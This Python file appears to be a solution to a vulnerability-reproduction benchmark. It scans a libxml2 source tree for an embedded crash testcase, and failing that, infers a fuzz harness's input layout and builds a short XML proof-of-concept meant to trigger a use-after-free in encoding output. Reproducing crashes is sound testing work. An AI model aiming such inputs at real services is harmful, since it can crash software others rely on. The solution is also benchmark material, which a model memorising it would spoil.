import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, Iterable, List, Optional, Tuple


@dataclass
class FuzzerInfo:
    path: str
    code: str
    score: int


@dataclass
class InferredFormat:
    parse_offset: int = 0
    enc_array: Optional[List[str]] = None
    enc_array_name: Optional[str] = None
    enc_select_data_index: Optional[int] = None
    enc_select_op: Optional[str] = None  # '%', '&', None
    enc_select_mask: Optional[int] = None


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._try_find_embedded_poc(src_path)
        if poc is not None:
            return poc

        fuzzers = self._find_fuzzers(src_path)
        best = max(fuzzers, key=lambda f: f.score, default=None)

        fmt = InferredFormat()
        if best is not None:
            fmt = self._infer_format(best.code)

        return self._generate_poc(fmt)

    def _iter_files_dir(self, root: str) -> Iterable[Tuple[str, int, bytes]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                p = os.path.join(dirpath, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                if not os.path.isfile(p):
                    continue
                size = st.st_size
                try:
                    with open(p, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
                rel = os.path.relpath(p, root).replace(os.sep, "/")
                yield rel, size, data

    def _iter_files_tar(self, tar_path: str) -> Iterable[Tuple[str, int, bytes]]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    size = m.size
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield name, size, data
        except Exception:
            return

    def _iter_files(self, src_path: str) -> Iterable[Tuple[str, int, bytes]]:
        if os.path.isdir(src_path):
            yield from self._iter_files_dir(src_path)
        else:
            yield from self._iter_files_tar(src_path)

    def _try_find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        keywords = (
            "42537493",
            "clusterfuzz",
            "testcase",
            "crash",
            "repro",
            "poc",
            "oss-fuzz",
            "ossfuzz",
            "uaf",
            "use-after-free",
            "use_after_free",
        )
        candidates: List[Tuple[int, int, str, bytes]] = []
        for name, size, data in self._iter_files(src_path):
            lname = name.lower()
            if size <= 4096 and any(k in lname for k in keywords):
                candidates.append((0, size, name, data))
            elif size == 24 and ("fuzz" in lname or "regress" in lname or "test" in lname):
                candidates.append((1, size, name, data))
            elif size == 24 and any(k in lname for k in ("crash", "testcase", "clusterfuzz", "repro", "poc")):
                candidates.append((0, size, name, data))
        if not candidates:
            return None
        candidates.sort(key=lambda x: (x[0], x[1], len(x[3])))
        return candidates[0][3]

    def _decode_text(self, b: bytes) -> str:
        try:
            return b.decode("utf-8", "ignore")
        except Exception:
            return b.decode("latin-1", "ignore")

    def _find_fuzzers(self, src_path: str) -> List[FuzzerInfo]:
        exts = (".c", ".cc", ".cpp", ".cxx")
        fuzzers: List[FuzzerInfo] = []
        for name, size, data in self._iter_files(src_path):
            lname = name.lower()
            if not lname.endswith(exts):
                continue
            if size > 2_500_000:
                continue
            if "fuzz" not in lname and "fuzzer" not in lname and "oss-fuzz" not in lname and "ossfuzz" not in lname:
                continue
            code = self._decode_text(data)
            if "LLVMFuzzerTestOneInput" not in code and "LLVMFuzzerInitialize" not in code:
                continue
            score = 0
            if "LLVMFuzzerTestOneInput" in code:
                score += 10
            for kw, pts in (
                ("xmlSaveToBuffer", 20),
                ("xmlSaveToIO", 16),
                ("xmlSaveToFd", 12),
                ("xmlSaveFormatFileEnc", 14),
                ("xmlSaveFileEnc", 14),
                ("xmlDocDumpMemoryEnc", 18),
                ("xmlDocDumpFormatMemoryEnc", 18),
                ("xmlOutputBuffer", 10),
                ("xmlAllocOutputBuffer", 10),
                ("xmlOutputBufferCreate", 8),
                ("encoding", 4),
                ("xmlReadMemory", 4),
                ("xmlReadDoc", 3),
                ("xmlParse", 2),
            ):
                if kw in code:
                    score += pts
            fuzzers.append(FuzzerInfo(path=name, code=code, score=score))
        return fuzzers

    def _infer_format(self, code: str) -> InferredFormat:
        fmt = InferredFormat()
        fmt.parse_offset = self._infer_parse_offset(code)
        enc_name, enc_list = self._infer_encoding_array(code)
        if enc_list:
            fmt.enc_array_name = enc_name
            fmt.enc_array = enc_list
            sel = self._infer_encoding_selector_expr(code, enc_name)
            if sel is not None:
                fmt.enc_select_data_index, fmt.enc_select_op, fmt.enc_select_mask = sel
        return fmt

    def _infer_parse_offset(self, code: str) -> int:
        offsets: List[int] = []

        def add_offset(val: int) -> None:
            if 0 <= val <= 64:
                offsets.append(val)

        patterns = [
            r'\bxmlReadMemory\s*\(\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*data\s*\+\s*(\d+)',
            r'\bxmlReadMemory\s*\(\s*&\s*data\s*\[\s*(\d+)\s*\]',
            r'\bxmlReadMemory\s*\(\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*\&\s*data\s*\[\s*(\d+)\s*\]',
            r'\bhtmlReadMemory\s*\(\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*data\s*\+\s*(\d+)',
            r'\bhtmlReadMemory\s*\(\s*&\s*data\s*\[\s*(\d+)\s*\]',
            r'\bxmlCtxtReadMemory\s*\(\s*[^,]*,\s*\(?\s*(?:const\s+char\s*\*\s*)?\)?\s*data\s*\+\s*(\d+)',
            r'\bxmlCtxtReadMemory\s*\(\s*[^,]*,\s*&\s*data\s*\[\s*(\d+)\s*\]',
        ]
        for pat in patterns:
            for m in re.finditer(pat, code, flags=re.S):
                try:
                    add_offset(int(m.group(1)))
                except Exception:
                    pass

        if not offsets:
            return 0
        return max(offsets)

    def _looks_like_encoding(self, s: str) -> bool:
        if not s or len(s) > 40:
            return False
        if not re.fullmatch(r"[A-Za-z0-9._+-]+", s):
            return False
        u = s.upper()
        markers = ("UTF", "ISO", "CP", "WINDOWS", "KOI", "EUC", "SHIFT", "SJIS", "GB", "BIG5", "ASCII", "IBM", "MAC")
        return any(m in u for m in markers)

    def _infer_encoding_array(self, code: str) -> Tuple[Optional[str], Optional[List[str]]]:
        best_name = None
        best_list: Optional[List[str]] = None
        best_score = 0

        # e.g., const char *encs[] = { "UTF-8", "CP1251", ... };
        array_pat = re.compile(
            r'(?:static\s+)?(?:const\s+)?char\s*\*\s*(?:const\s+)?(\w+)\s*\[\s*\]\s*=\s*\{(.*?)\}\s*;',
            re.S,
        )
        for m in array_pat.finditer(code):
            name = m.group(1)
            body = m.group(2)
            strs = re.findall(r'"([^"\\]*(?:\\.[^"\\]*)*)"', body, flags=re.S)
            if not strs:
                continue
            cleaned = []
            enc_like = 0
            for raw in strs:
                try:
                    s = bytes(raw, "utf-8").decode("unicode_escape", "ignore")
                except Exception:
                    s = raw
                s = s.strip()
                if not s:
                    continue
                cleaned.append(s)
                if self._looks_like_encoding(s):
                    enc_like += 1
            if enc_like >= 2 and len(cleaned) >= 2:
                score = enc_like * 10 + len(cleaned)
                if "enc" in name.lower() or "encoding" in name.lower():
                    score += 15
                if score > best_score:
                    best_score = score
                    best_name = name
                    best_list = cleaned

        return best_name, best_list

    def _infer_encoding_selector_expr(self, code: str, arr_name: Optional[str]) -> Optional[Tuple[int, Optional[str], Optional[int]]]:
        if not arr_name:
            return None
        # Look for arr_name[ data[IDX] % ... ] or arr_name[ data[IDX] & MASK ] or arr_name[data[IDX]]
        # Return (IDX, op, mask/None)
        pat = re.compile(rf'\b{re.escape(arr_name)}\s*\[\s*([^\]]+)\]', re.S)
        for m in pat.finditer(code):
            expr = m.group(1)
            if "data" not in expr:
                continue
            m2 = re.search(r'data\s*\[\s*(\d+)\s*\]', expr)
            if not m2:
                continue
            try:
                didx = int(m2.group(1))
            except Exception:
                continue
            op = None
            mask = None
            m3 = re.search(r'data\s*\[\s*' + re.escape(m2.group(1)) + r'\s*\]\s*([%&])\s*([0-9]+|0x[0-9A-Fa-f]+)', expr)
            if m3:
                op = m3.group(1)
                rhs = m3.group(2)
                try:
                    mask = int(rhs, 0)
                except Exception:
                    mask = None
            elif "%" in expr:
                op = "%"
            elif "&" in expr:
                op = "&"
            return (didx, op, mask)
        return None

    def _pick_encoding_index(self, encodings: List[str], limit: Optional[int] = None) -> int:
        if not encodings:
            return 0
        candidates = []
        for i, e in enumerate(encodings):
            if limit is not None and i >= limit:
                break
            u = e.upper()
            if u.startswith("UTF"):
                continue
            if u in ("ASCII", "US-ASCII"):
                continue
            # Prefer common iconv-backed encodings
            pref = 0
            if "1251" in u or "1252" in u:
                pref += 50
            if "WINDOWS" in u or u.startswith("CP"):
                pref += 40
            if "KOI" in u or "EUC" in u or "SHIFT" in u or "SJIS" in u or "GB" in u or "BIG5" in u:
                pref += 30
            if "ISO" in u and "8859" in u:
                pref += 10
            if pref > 0:
                candidates.append((pref, -len(e), i))
        if candidates:
            candidates.sort(reverse=True)
            return candidates[0][2]
        # fallback: choose first non-UTF
        for i, e in enumerate(encodings[: (limit if limit is not None else len(encodings))]):
            if not e.upper().startswith("UTF"):
                return i
        return 0

    def _generate_poc(self, fmt: InferredFormat) -> bytes:
        # Base XML: valid, forces non-UTF doc encoding and includes a non-ASCII character via entity.
        xml = b'<?xml version="1.0" encoding="CP1251"?><a>&#169;</a>'

        # If we can control a selector byte safely (i.e., within skipped prefix), do it.
        prefix_len = max(0, fmt.parse_offset)
        prefix = bytearray(b"\x00" * prefix_len)

        if (
            fmt.enc_array
            and fmt.enc_select_data_index is not None
            and fmt.enc_select_data_index < fmt.parse_offset
            and fmt.enc_select_data_index >= 0
        ):
            arr_len = len(fmt.enc_array)
            if arr_len > 0:
                op = fmt.enc_select_op
                mask = fmt.enc_select_mask

                if op == "&" and isinstance(mask, int) and mask >= 0:
                    # Ensure chosen index fits into the mask range if possible.
                    idx = self._pick_encoding_index(fmt.enc_array, limit=min(arr_len, mask + 1))
                    val = idx  # choose data byte so (val & mask) == idx, with idx <= mask
                    if idx > mask:
                        idx = idx & mask
                        val = idx
                    prefix[fmt.enc_select_data_index] = val & 0xFF
                else:
                    idx = self._pick_encoding_index(fmt.enc_array)
                    # For modulo/sizeof patterns, setting the byte to idx should select idx.
                    prefix[fmt.enc_select_data_index] = (idx & 0xFF)

        out = bytes(prefix) + xml

        # Some harnesses may require a minimum length; trailing spaces are valid XML Misc after the document.
        min_len = 24
        if len(out) < min_len:
            out = out + (b" " * (min_len - len(out)))

        return out